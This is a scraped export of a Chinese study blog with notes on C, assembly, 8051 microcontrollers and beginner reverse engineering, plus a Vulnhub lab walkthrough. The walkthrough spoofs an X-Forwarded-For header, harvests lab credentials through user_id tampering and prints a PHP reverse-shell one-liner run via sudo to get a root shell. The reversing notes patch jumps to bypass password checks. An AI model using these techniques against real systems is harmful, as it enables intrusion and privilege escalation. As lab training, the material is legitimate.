npcindex-&gt;Name = \"xiao222\"; return 0;&#125; 结构体参数在函数中的应用：作为参数 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;struct NPC&#123; char * Name; int HP; int MP;&#125;;int outputNPC(struct NPC a) &#123; printf(\"%s\\nHP=%d\\nMP=%d\", a.Name, a.HP, a.MP); return 0;&#125;int initNPC(char * name, int HP, int MP) &#123; struct NPC npc1; npc1.Name = name; npc1.HP = HP; npc1.MP = MP; outputNPC(npc1); return 0;&#125;int main() &#123; initNPC(\"lihua\", 10, 1000); return 0;&#125; 联合体12345678910111213141516#include \"main.h\"union Info &#123; int HP; char PlayerName;&#125;;int main() &#123; union Info Myinfo; Myinfo.PlayerName = 'a'; //联合体所有成员地址都是一样的 Myinfo.HP = 1111; //多个值初始化之后只显示最后一个值，也就是同时只能使用其中一个成员 printf(\"%c\\n%d\\n\", Myinfo.PlayerName, Myinfo.HP); return 0;&#125; 枚举类型1234567891011121314#include \"main.h\"int main() &#123; enum color &#123;red,green,blue&#125;;//实际是个整数类型 int flag = 0; scanf(\"%d\", &amp;flag); switch (flag) &#123; case red:printf(\"red\"); break; case green:printf(\"freen\"); break; case blue:printf(\"blue\"); break; &#125; //用来看的更清晰 return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础07--文件操作","date":"2020-05-28T03:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础07--文件操作/","text":"C语言基础07–文件操作fopen模式 读取文件： 声明一个文件指针 通过fopen打开文件获得文件指针 判断文件指针是否为空，为空则打开失败 把文件指针放到文件末尾来获取文件大小 指针再移动会文件头部 申请一块缓冲区空间用来存储读取的数据 对空间初始化 通过fread获取文件内容和真实大小 通过真实大小和刚刚获取的大小进行比较，如果相同则读取成功 读取完毕，通过fclose关掉文件指针 写文件： 声明一个文件指针 通过fopen打开文件获得文件指针 通过fwrite来写入文件，返回1则写入成功 关闭文件指针 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //通过移动位于文件头部的指针，可以读取文件任意位置的数据，文件指针移动到末尾处，文件读取完毕 //声明文件指针，FILE类型 FILE * pFile; //申请一个内存空间存储文件内容，也就是char * 类型字符串 char * szReadTextBuffer; //申请一个变量存储文件尺寸 int nReadFileSize; //获取读取到的文件缓冲区字节数,使用fread会返回真实长度，用来判断读取是否成功 int nReadRetSize; //fopen 可以用于打开文件，两个参数：文件路径和读取模式 if ((pFile = fopen(\"E:\\\\123.txt\", \"rb\")) == NULL) &#123; //读取失败返回NULL printf(\"文件打开失败\"); exit(0); &#125; //通过设置文件指针到文件末尾，可以算出文件大小 //设置文件指针到末尾 fseek(pFile, 0, SEEK_END);//fseek用来设置指针位置（文件指针，0，要移动的位置）SEEK_END表示文件末尾（设定好的宏） //获取文件指针的位置,获取文件大小 nReadFileSize = ftell(pFile); //文件指针复位 rewind(pFile);//用来恢复到初始位置 //根据文件尺寸声明足够大小的内存空间 szReadTextBuffer = (char *)malloc(sizeof(char)*nReadFileSize + 1); //判断一下是否申请成功 if (szReadTextBuffer == NULL) &#123; printf(\"failed\"); exit(0); &#125; //对申请到的空间初始化 memset(szReadTextBuffer, 0, nReadFileSize + 1); //将依据获取到文件指针的文件内容读取到已经申请好的缓冲区中，并返回真实读取到的长度 nReadRetSize = fread(szReadTextBuffer, 1, nReadFileSize, pFile); //判断是否读取失败 if (nReadFileSize != nReadRetSize) &#123; printf(\"failed\"); exit(0); &#125; printf(\"%s\", szReadTextBuffer); fclose(pFile); FILE * pFile0; pFile0 = fopen(\"E:\\\\1234.txt\", \"wb\"); //fwrite作用把字符串写入文件中，第一个是缓冲区指针，第二个是写出单个元素的大小，第三个元素个数，第四个是文件指针 int s = fwrite(szReadTextBuffer, strlen(szReadTextBuffer), 1, pFile0); fclose(pFile0); return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础06--存储类&内存管理","date":"2020-05-28T02:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础06--存储类&内存管理/","text":"C语言基础06–存储类&amp;内存管理存储类C语言有6种存储类，可以按照作用域，链接，存储时期来描述 存储时期分为两种 静态存储时期：类似于局部变量 自动存储时期：类似于全局变量 存储类除了指针存储类还有5种： 自动存储类 auto ：生命周期在花括号内 寄存器存储类 register 具有外部链接的静态存储类 extern：生命周期是在整个程序内 具有外部链接的静态存储类 static：生命周期是在文件内 空链接的静态存储类 static 内存管理12345678#include&lt;stdlib.h&gt;int main() &#123; char * szstr; //没初始化，所以没分配内存 szstr = (char *)malloc(20 * sizeof(char));//使用malloc分配内存，50个char类型的大小 memset(szstr, 0, 50 * sizeof(char)); //初始化为0 free(szstr); //释放内存 return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础13--间接寻址","date":"2020-05-26T02:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础13--间接寻址/","text":"汇编基础13–间接寻址可以把寄存器当做指针来进行寻址操作 12345678910111213141516.data arrnum word 1,2,3,4,5,6,7.codemain proc xor eax ,eax xor ebx ,ebx mov eax ,offset arrnum mov bl ,[eax] add eax ,2 mov bl ,[eax] add eax ,2 mov bl ,[eax] add eax ,2 invoke ExitProcess,0main endpEND main 也可以这样 12345678910111213.data arrnum word 1,2,3,4,5,6,7.codemain proc xor eax ,eax xor ebx ,ebx mov eax ,offset arrnum mov bl ,[eax] mov bl ,[eax+2] mov bl ,[eax+4] invoke ExitProcess,0main endpEND main 比例因子利用数组下标进行寻址 123456789.data arrnum dword 1,2,3,4,5,6,7.codemain proc mov esi ,4 mov eax ,arrnum[esi * 4] invoke ExitProcess,0main endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"51单片机入门04--定时&计数器","date":"2020-05-20T12:57:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门04--定时&计数器/","text":"51单片机入门04–定时&amp;计数器原理 常用的工作方式是1（16位）和2（8位自动重置，用于串口通信产生波特率） 一般用的是工作方式1 GATE一般给0，如果通过外部中断来启用定时计数器，可以给1 工作方式 单片机定时器单位是us，1ms=1000us 11.0592MHz用于通讯 例：使用定时器显示数字，每秒一变 123456789101112131415161718192021222324252627282930313233343536#include \"reg51.h\"unsigned char num[] = &#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;int n = 0;int count = 0;void inittimer()&#123; TMOD = 0x01; //0000 0001 TH0 = (65536-50000)/256;//16位定时初值高8位 TL0 = (65536-50000)%256; ET0 = 1;//开启定时器0中断 EA = 1; //开启总中断 TR0 = 1; //开启定时器0&#125;void display()&#123; P2 = num[n]; if(n == 10)&#123; n = 0; &#125;&#125;void main()&#123; inittimer(); while(1)&#123; display(); &#125;&#125;void timer_isr() interrupt 1&#123; TH0 = (65536-50000)/256; //50us TL0 = (65536-50000)%256; count++; if(count==20)&#123; n++; count=0; &#125;&#125; 示例：计数器 12345678910111213141516171819202122232425262728#include \"reg51.h\"unsigned char num[] = &#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;int n=0;void initcounter()&#123; TMOD = 0x06; TH0 = 256 - 1; TL0 = TH0; ET0 =1; EA =1; TR0 =1;&#125;void display()&#123; P2 = num[n]; if(n == 10)n=0;&#125;void main()&#123; initcounter(); while(1)&#123; display(); &#125;&#125;void counter_isr() interrupt 1&#123; n++;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"【Vulnhub】Me And My Girlfriend--Workthourgh","date":"2020-05-20T08:06:19.000Z","path":"wiki/靶机笔记/vulnhub/5-MeAndMyGirlfriend/","text":"【Vulnhub】Me And My Girlfriend:1–Workthourgh 文章作者：kn0sky 作者博客：kn0sky.com 本来想下载新的靶机去玩的，无奈下载速度太慢，无意间发现去年下载的没打过的靶机，是个简单难度的，刚好挺久没练习了，有点生疏了拿来练练手，耗时：2小时 靶机信息1234567891011Date release: 13 Dec 2019Author: TW1C3Series: Me and My GirlfriendDescription: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!Difficulty Level: BeginnerNotes: there are 2 flag filesLearning: Web Application | Simple Privilege Escalation 靶机下载地址：https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/ 用到的知识&amp;工具 nmap&amp;主机发现、端口扫描 burp&amp;修改请求包信息 sudo -l查看权限 php反弹shell 渗透过程攻击机的IP地址为192.168.101.5 靶机的IP地址为192.168.101.4 先端口扫描 目标开放了22端口和80端口 查看80端口 看起来像个提示，等会再说，先进行目录爆破看看，得到几个可以访问的地址 在robots.txt文件里找到如下内容： 12User-Agent: *Allow: &#x2F;heyhoo.txt 访问这个地址： 看起来又是个提示 这个网站主页上说，网站只能从内部访问，这里猜测服务器通过IP地址来判断访问者来源，那么我们在访问请求中添加XFF头来试一试：X-Forwarded-For:127.0.0.1 网站成功跳转了（这里注意，每次发送请求都需要把XFF头加上）,成功进入网站主页： 浏览一番发现，网站存在用户名密码泄露的问题，这里我们通过注册功能注册一个账号，然后登录进入，进入profile页面如下： 在这个页面刷新，用Burp抓包，把抓到的包放到repeater模块中 可以轻易发现，我们的账号密码在网页中是以明文保存的，这个时候我们修改请求中的user_id参数，可以发现，不同的user_id的值代表不同的用户信息（账号&amp;密码） 通过不断修改user_id的值我们可以得到如下用户名和密码： 12345eweuhtandingan:skuyatuhaingmaung:qwerty!!!sundatea:indONEsiasedihaingmah:cedihhihihialice:4lic3 拿到了目标Alice的账号密码，ssh登录服务器看看： 登陆成功，且在alice的主目录下找到了flag1 以及emmmm，alice不喜欢bob了？？？算了，管他呢 12alice@gfriEND:~/.my_secret$ cat my_notes.txt Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes 下一步是拿到root权限，先查看一下Alice账号的权限吧： 123456alice@gfriEND:~/.my_secret$ sudo -lMatching Defaults entries for alice on gfriEND: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alice may run the following commands on gfriEND: (root) NOPASSWD: /usr/bin/php alice可以免密码使用root权限执行php命令，这就好办了，思路是通过root权限执行php反弹shell到攻击机上 先在攻击机上运行nc来监听 12root@windows7:~# nc -nvlp 7788listening on [any] 7788 ... 然后使用alice 的账号运行php反弹shell 1alice@gfriEND:~/.my_secret$ sudo php -r '$sock=fsockopen(\"192.168.101.5\",7788);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 这个时候我们拿到了反弹的shell: 12345root@windows7:~# nc -nvlp 7788listening on [any] 7788 ...connect to [192.168.101.5] from (UNKNOWN) [192.168.101.4] 43264# whoamiroot 既然已经提权到root了，直接去root目录找flag 到此正式结束","tags":[],"categories":[{"name":"靶机笔记","slug":"靶机笔记","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"},{"name":"vulnhub","slug":"靶机笔记/vulnhub","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"}]},{"title":"逆向基础02--初试破解","date":"2020-05-16T17:40:50.000Z","path":"wiki/学习笔记/逆向入门学习笔记/逆向基础02--初试破解/","text":"逆向基础02–初试破解三个例子初试破解学习记录（样本均来自知识星球课件） 例一：控制台破解例子目标是：登录成功！ 0x01 先找到程序入口通过查找参考文本字符串可以轻松找到入口位置： 0x02 分析程序通过阅读反汇编代码，我们可知程序会首先让我们输入一次密码，然后把输入的密码一位一位和正确答案比对正确一位，如果全都相同也就是eax大于5，则登录成功 思路： 直接跳转到登录成功的地方 修改eax大于5 修改待比对的数值，然后输入修改过的密码 通过待比对的数值计算出密码 0x03 破解程序直接按照思路1走最简单 完成 例二：MFC破解例子重点在于学会查找字符串 这是图形界面的程序","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逆向入门学习笔记","slug":"学习笔记/逆向入门学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"逆向基础01--初见逆向","date":"2020-05-16T13:40:50.000Z","path":"wiki/学习笔记/逆向入门学习笔记/逆向基础01--初见逆向/","text":"逆向基础01–初见逆向在使用VS2015生成解决方案的时候，有两个版本： 分别是Debug和Release版 Debug版比较大，带调试信息 Release版更小，会对代码进行优化精简 寻找主程序在逆向的时候，第一件事是先找到主程序 示例程序： 12345#include&lt;stdio.h&gt;int main() &#123; printf(\"hello world!\"); return 0;&#125; 这里有个字符串hello world!在运行的时候回打印出来，所以可以作为标志点去寻找 对于debug版本：（使用Ollydbg） ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进去 对于Release版本： ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进入 F8跳转，见到红的F7进去，直到3个push1个call，很有可能是main函数（main函数特点：3个参数）F7进去看 也可以直接往上拖，一般release版本main函数在最上面附近 如果有API查找所有模块调用 也可以用ida，ida会自动分析出main函数 内存中数据的修改比如将前面的代码输出的hello world改为其他内容 直接修改1： 找到需要修改的地方，F2加断点，F9执行过去 在内存窗口上右键，转到，输入地址 ollydbg在地址上，左键拖动选中，右键，二进制，编辑修改 不保持大小可能会淹掉后面的数据 直接修改2： 在内存空的地方，修改入其他的值 找到需要修改的地方的push，把push后面的地址改为刚才修改过的地址 修改的作用：跳过程序中某些过程 修改跳转示例代码： 12345678910111213#include&lt;stdio.h&gt;int main() &#123; int nNum = 0; scanf(\"%d\", &amp;nNum); if (nNum == 87998623) &#123; printf(\"success!\"); &#125; else &#123; printf(\"failed!\"); &#125; system(\"pause\"); return 0;&#125; 目的是输出success 先在ollydbg里找到main函数 找到关键跳转，双击，汇编，改成我们要去的地址 然后我随便输入个啥，都能输出success啦 把对比对象的值改掉也行，方法不唯一 滑板指令使用nop（没有作用的指令）把跳转改掉 还是刚才那个程序，修改结果如下： 执行完，打印出success！这里就不放图了","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逆向入门学习笔记","slug":"学习笔记/逆向入门学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础05--字符串操作","date":"2020-05-16T07:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础05--字符串操作/","text":"C语言基础05–字符串操作字符串的声明1234567891011121314#include&lt;stdio.h&gt;int main() &#123; //字符串的声明可以用3钟方法 //在c/c++里，字符串以00结尾，第一种方式声明会自动在字符串末尾加00 char str[] = &#123; \"hello\" &#125;; //第二种方式声明需要手动添加\\0 char str1[] = &#123; 'h','e','l','l','o','\\0' &#125;; //第三种方式声明和声明数组是一样的 char * str2 = \"hello\"; printf(\"%s,%s,%s\", str, str1, str2); return 0;&#125; 字符串的输入3种方法从控制台接收字符串 12345678910111213141516#include&lt;stdio.h&gt;int main() &#123; //三种从控制台获取输入的途径：gets/fgets/scanf char str[50]; //gets 默认以回车的方式结束输入 //gets(str); //fgets接收3个参数，存放字符串的位置，接收字符串的长度，接收模式 与gets的区别在于会接收回车，能控制接收大小 //fgets(str,50,stdin); //scanf通过格式化输入来控制输入长度 scanf(\"%5s\", &amp;str); printf(\"%s\", str); return 0;&#125; 字符串的输出123456789#include&lt;stdio.h&gt;int main() &#123; char str[] = &#123;\"hello\\n\"&#125;; //两种方式：puts printf puts(str);//自带换行 printf(\"%d\", str); return 0;&#125; 计算字符串长度12345678910#include&lt;stdio.h&gt;#include&lt;string.h&gt; //字符串操作一般都包含进去，会用得上int main() &#123; //字符串以00或者\\0结尾，真实长度比输出来的长度要多1 char str[] = &#123;\"hello\"&#125;; int a = strlen(str); printf(\"a=%d\", a); return 0;&#125; 字符串拼接123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //字符串拼接的两个函数：strcat,strncat //strcat接收两个参数：目的字符串，源字符串，将源字符串拷贝到目的字符串后面，存到目的字符串里 //strncat接收三个参数：目的字符串，源字符串，接收长度，将指定长度的源字符串拷贝到目的字符串后面，存到目的字符串里 char str1[] = \"hello \"; char str2[] = \"world \\n\"; //strcat(str1, str2); //printf(\"%s\", str1); strncat(str1, str2,2); printf(\"%s\", str1); return 0;&#125; 字符串对比12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //strcmp strcnmp //strcmp接收两个参数：待比较的两个字符串，返回0表示相等，返回其他值表示不相等 //strncmp接收三个参数，待比较的两个字符串和比对的字符数（从头往后数）,返回值同上 char str1[] = \"hello\"; char str2[] = \"hello world\"; int res = 0; //res = strcmp(str1, str2); //-1 res = strncmp(str1, str2, 5); //0 printf(\"%d\", res); return 0;&#125; 字符串拷贝12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //strcpy strncpy //strcpy接收两个参数：目的字符串和源字符串，将源字符串的东西拷贝到目的字符串里 //strncpy比上面多接收一个参数，拷贝的字符数 char str1[30] = &#123; 0 &#125;;//这里需要用0初始化，因为字符串找到0才结尾，打印的时候会出现烫烫烫烫烫烫 char str2[] = \"hello world\"; //strcpy(str1, str2); strncpy(str1, str2,5); printf(\"%s\", str1); return 0;&#125; 字符串格式化1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //sprintf：将printf格式化输出的结果保存到字符串里 //接收三个参数，一个是目标字符串，2是格式化格式，3是格式化内容 char str[] = &#123;\"hello\"&#125;; int n = 10; printf(\"%s,%d\\n\", str, n); char str0[20] = &#123; 0 &#125;; sprintf(str0, \"%s,%d\\n\", str, n); printf(\"%s\",str0); return 0;&#125;//两个输出是一样的 动态内存管理三步骤： 申请内存 malloc,memset 使用内存 释放内存 free 123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; char * str; //malloc在堆上面申请内存，返回的是void * str = (char *)malloc(200 * sizeof(char)); //memset,把一段内存地址刷成你想要的的值 memset(str, 0, 200 * sizeof(char)); strcpy(str, \"asdjaljfalkjas\"); //free 释放内存 free(str); return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础04--指针","date":"2020-05-16T02:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础04--指针/","text":"C语言基础04–指针指针与变量之间的关系*：指针运算符，跟在变量前表示指向地址的值 &amp;：取地址运算符 12345678910111213141516171819#include&lt;stdio.h&gt;int main() &#123; int a = 123; int * b = &amp;a; //指什么类型的地址，声明什么类型的指针 //这里是把a的地址给b *b = 666; //a指的是地址上的值 //b指的是地址 //&amp;a指的是地址 //*b指的是地址上的值 a = 567; return 0;&#125;//在汇编中//mov dword ptr [a] ,2F6ah//dword 是数据长度，4字节//ptr 指针//a a的地址//[a] a的值 指针与数组12345678910#include&lt;stdio.h&gt;int main() &#123; //数组是内存地址中连续的存储空间 //数组的名字指向数组首地址 int n[5] = &#123; 1,2,3,4,5 &#125;; int * a = n; //a就是数组首地址，*a的值为1 int b = *(a + 1);//这里+1指的是+1个int类型的长度 //(a+1)相当于是数组下一位的地址，然后前面跟上*来取地址的值 return 0;&#125; 指针与函数函数指针12345678910111213141516171819#include&lt;stdio.h&gt;int sub(int a, int b);int main() &#123; //指针函数是函数,指针类型的函数，返回值也是指针 //函数指针是指针，指向函数的指针 int(*mysub)(int a, int b);//函数指针 mysub = sub; //不带括号不带参数的函数名是函数的首地址 int c = mysub(2,1); // 调用的时候，mysub指向跳转表的sub，然后跳转表指向函数的sub int d = sub(2, 3); // 调用的时候，sub也先指向跳转表的sub，然后跳转表指向函数sub return 0;&#125;int sub(int a, int b) &#123; return a - b;&#125; 指针函数12345678910111213141516#include&lt;stdio.h&gt;int * ret(int * a);int main() &#123; int b[3] = &#123; 1,2,3 &#125;; int a = &amp;b[1]; int * c = ret(a); //这里的c是地址，是a的地址,也就是把函数返回的地址给c int d = *c; //*c是a的地址的值 return 0;&#125;int * ret(int * a) &#123; //传入一个地址作为参数 int b = a; //a为地址 int c = *a; //*a为a的值 return a; //返回的是a的地址&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础03--宏&函数&数组","date":"2020-05-16T00:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础03--宏&函数&数组/","text":"C语言基础03–宏&amp;函数&amp;数组宏预先定义一个东西，编译的时候被替换掉，有点常量的感觉 123456789101112#include&lt;stdio.h&gt;#define nNUm = 10; //宏，类似于常量，无参数宏#define add (a+b); //表达式，无参数宏#define max(a,b) ((a&gt;b)?(a):(b)) //三元运算符，有参数宏int main()&#123; int a=1; int b=2; printf(\"%d\",add);//3 printf(\"%d\",max(a,b));//2 printf(\"%d\",a+nNum); //11 return 0&#125; typedef给类型起别名,define宏也能达到类似的效果，但是不能处理指针 12345int main()&#123; typedef int df; df a&#x3D;1; printf(&quot;%d&quot;,a);&#125; 函数123456789101112131415#include&lt;stdio.h&gt;int add(int a, int b); //函数声明,函数位于main函数之下，必须在上面声明一下int main() &#123; int a = 11, b = 22; int c = 0; c = add(a, b); //33 printf(\"%d\", c); return 0;&#125;int add(int a ,int b) &#123; //函数定义 return a + b; //返回值&#125; 递归自己嵌套自己 123456789101112131415161718#include&lt;stdio.h&gt;int func1(int n); int main() &#123; int n = 5; func1(n); return 0;&#125;int func1(int n) &#123; if (n != 0) &#123; n--; printf(\"hello the %d world\\n\", n); return func1(n); &#125; else &#123; printf(\"end\"); return 0; &#125;&#125; 一维数组数组的内容必须是同一类型的，通过下标来索引 1234567#include&lt;stdio.h&gt;int main() &#123; int n[5] = &#123;1,2,3,4,6&#125;; printf(\"%d\",n[4]); return 0;&#125; 多维数组12345678910111213141516#include&lt;stdio.h&gt;int main()&#123; int n[3][3]=&#123; &#123;1,2,3&#125;, &#123;2,3,4&#125;, &#123;3,4,5&#125; &#125;; printf(\"%d\",n[2][2]); for(int i=0;i&lt;3;i++)&#123; for(int j=0;j&lt;3;j++)&#123; printf(\"%d\".n[i][j]); &#125; &#125; return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础02--条件语句","date":"2020-05-15T07:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础02--条件语句/","text":"C语言基础02–条件语句goto语句类似于汇编中的JMP,尽量不要用goto，实在没办法再用 123456789#include&lt;stdio.h&gt;int main() &#123; goto loop; printf(\"1\");loop: printf(\"2\"); return 0;&#125; if-else语句123456789int main()&#123; if(true)&#123; //条件为true，执行这里 &#125;else&#123; //反之，执行这里 &#125; //cmp //jnz&#125; switch语句12345678910111213141516int main()&#123; int n1=5; switch(n1)&#123; case 1: printf(\"1\");break; case 2: printf(\"2\");break; default: printf(\"?\");break; &#125; return 0; //cmp //jz //cmp //jz&#125; while语句12345678910111213int main()&#123; int n=100; while(n&gt;1)&#123;//满足条件就开始循环 printf(\"n\"); n--; &#125; return 0; // mov // cmp // call // dec // jmp&#125; do-while语句123456789101112int main()&#123; int n=0; do&#123; //先执行一遍 printf(\"1\"); n++; &#125;while(n&lt;100); //再判断条件进行循环 return 0;&#125;// mov// &#123;&#125;// cmp// jz for语句123456789101112#include&lt;stdio.h&gt;int main()&#123; for(int i=0;i&lt;100;i++)&#123;//类似while，但是把定义判断循环整合在一起了，类似于while的简写 printf(\"1\"); &#125; &#125;// mov// cmp// jz// call// jmp// inc","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础01--初见C语言","date":"2020-05-15T06:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础01--初见C语言/","text":"C语言基础01–初见C语言常见函数默认情况下，main函数是C语言的起点 printf()函数是格式化输出函数 （来自stdio.h） 单行注释：/ 单行内容 / 多行注释：/* 多行内容 */ 使用VS2015创建项目 新建项目 依次选择vc++ ，win32 ，win32控制台程序 随便写个项目名称 应用程序向导里选择空项目，其他默认 从源文件添加新建项，创建.c文件 开始写代码 第一个程序123456#include&lt;stdio.h&gt;int main() &#123; printf(\"hello world!\\n\"); return 0;&#125; 程序分析vs2015反汇编代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;stdio.h&gt;int main() &#123;;前面这块用于保障程序稳定性，把栈抬高，然后可以随便弄，弄完再把栈还原，再把寄存器的值还原;将ebp存起来，然后把栈抬高0C0H位00C41760 push ebp 00C41761 mov ebp,esp 00C41763 sub esp,0C0h;把ebx，esi，edi入栈00C41769 push ebx 00C4176A push esi 00C4176B push edi;把栈抬高的位置放到edi，然后从edi刷CCCCCCCCh00C4176C lea edi,[ebp-0C0h] 00C41772 mov ecx,30h 00C41777 mov eax,0CCCCCCCCh 00C4177C rep stos dword ptr es:[edi] ;这里是直接把字符串push进去，然后调用printf，然后平栈 printf(&quot;hello world!\\n&quot;);00C4177E push offset string &quot;hello world!\\n&quot; (0C46BD0h) 00C41783 call _printf (0C41316h) 00C41788 add esp,4 return 0;;等价于eax清零，比mov eax ,0效率高00C4178B xor eax,eax &#125;;把edi,esi,ebx取出来00C4178D pop edi 00C4178E pop esi 00C4178F pop ebx;把栈放回去00C41790 add esp,0C0h ;比较一下栈是否还在原来的位置00C41796 cmp ebp,esp 00C41798 call __RTC_CheckEsp 